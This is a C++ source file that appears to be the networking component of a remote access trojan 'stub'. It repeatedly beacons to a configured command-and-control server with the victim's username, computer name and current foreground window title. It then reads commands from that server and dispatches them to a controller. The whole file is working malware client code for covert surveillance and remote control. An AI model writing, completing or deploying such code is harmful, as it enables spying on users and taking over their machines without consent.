#include "networking.hpp"
#include "config.hpp"
#include "json.hpp"
#include "serpentine.hpp"
#include "controller.hpp"

#include <chrono>
#include <thread>
#include <atlstr.h>

namespace asio = boost::asio;
namespace json = nlohmann;

Networking& Networking::getInstance() {
	static Networking instance;
	return instance;
}

Networking::Networking() {
	ios = new asio::io_service;
	serverSocket = new asio::ip::tcp::socket(*ios);

	std::thread pingerThread(runPinger, ios, serverSocket);
	pingerThread.detach();
	std::thread receiverThread(runReceiver, serverSocket);
	receiverThread.detach();
}

void Networking::runPinger(asio::io_service* ios, asio::ip::tcp::socket* serverSocket) {
	CString computerName;
	DWORD computerNameSize = 1024;
	GetComputerName(computerName.GetBufferSetLength(computerNameSize), &computerNameSize);
	CT2CA computerNameConverted(computerName);

	CString userName;
	DWORD userNameSize = 1024;
	GetUserName(userName.GetBufferSetLength(userNameSize), &userNameSize);
	CT2CA userNameConverted(userName);

	json::json ping;
	ping["type"] = RequestType::PING;
	ping["computerName"] = std::string(userNameConverted) + "@" + std::string(computerNameConverted);
	ping["stubName"] = STUB_NAME;

	asio::ip::tcp::resolver::query resolverQuery(SERVER_ADDRESS, SERVER_PORT, asio::ip::tcp::resolver::query::numeric_service);
	asio::ip::tcp::resolver resolver(*ios);
	boost::system::error_code ec;
	asio::ip::tcp::resolver::iterator it;
	do {
		it = resolver.resolve(resolverQuery, ec);
		std::this_thread::sleep_for(std::chrono::milliseconds(5000));
	} while (ec.value() != 0);
	asio::ip::tcp::resolver::iterator it_end;

	for (;;) {
		HWND currentWindowHWND = GetForegroundWindow();
		char* currentWindowTitle = (char*)malloc(255);
		GetWindowTextA(currentWindowHWND, currentWindowTitle, 255);
		ping["activeWindowTitle"] = std::string(currentWindowTitle);

		asio::write(*serverSocket, asio::buffer(ping.dump() + "\n"), ec);
		if (ec.value() != 0) {
			for (auto i = it; i != it_end; ++i) {
				serverSocket->close();
				serverSocket->connect(i->endpoint(), ec);
				asio::write(*serverSocket, asio::buffer(ping.dump() + "\n"), ec);
				if (ec.value() == 0)
					break;
			}
		}
		free(currentWindowTitle);
		std::this_thread::sleep_for(std::chrono::milliseconds(5000));
	}
}

void Networking::runReceiver(asio::ip::tcp::socket* serverSocket) {
	asio::streambuf buffer;
	std::string message;
	boost::system::error_code ec;
	for (;;) {
		asio::read_until(*serverSocket, buffer, '\n', ec);
		if (ec.value() == 0) {
			std::istream inputStream(&buffer);
			std::getline(inputStream, message);
			Controller::dispatch(message);
		}
		else {
			std::this_thread::sleep_for(std::chrono::milliseconds(1000));
		}
	}
}

void Networking::sendToServer(std::string message) {
	boost::system::error_code ec;
	asio::write(*Networking::getInstance().serverSocket, asio::buffer(message + "\n"), ec);
}
